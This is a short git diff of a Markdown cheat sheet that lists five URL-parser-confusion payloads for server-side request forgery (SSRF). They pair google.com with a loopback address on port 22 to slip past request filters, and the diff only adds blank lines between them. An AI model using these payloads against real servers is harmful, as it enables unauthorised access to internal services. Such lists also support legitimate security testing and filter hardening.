@@ -4,9 +4,13 @@
 
 ### Quick URL based bypasses:
 `http://google.com:80+&@127.88.23.245:22/#+@google.com:80/`
+
 `http://127.88.23.245:22/+&@google.com:80#+@google.com:80/`
+
 `http://google.com:80+&@google.com:80#+@127.88.23.245:22/`
+
 `http://127.88.23.245:22/?@google.com:80/`
+
 `http://127.88.23.245:22/#@www.google.com:80/`
 
 ***
